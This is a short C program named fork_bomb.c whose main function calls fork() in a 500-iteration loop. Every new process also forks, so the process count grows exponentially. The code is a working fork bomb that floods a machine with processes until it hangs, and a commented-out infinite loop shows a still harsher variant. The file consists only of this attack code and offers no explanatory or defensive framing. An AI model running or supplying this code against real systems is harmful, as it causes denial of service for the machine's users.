// fork_bomb.c
#include <unistd.h>

int main() {
    // while(1) {
    for( int i = 0; i < 500; i++) {
        fork();
    }
    return 0;
}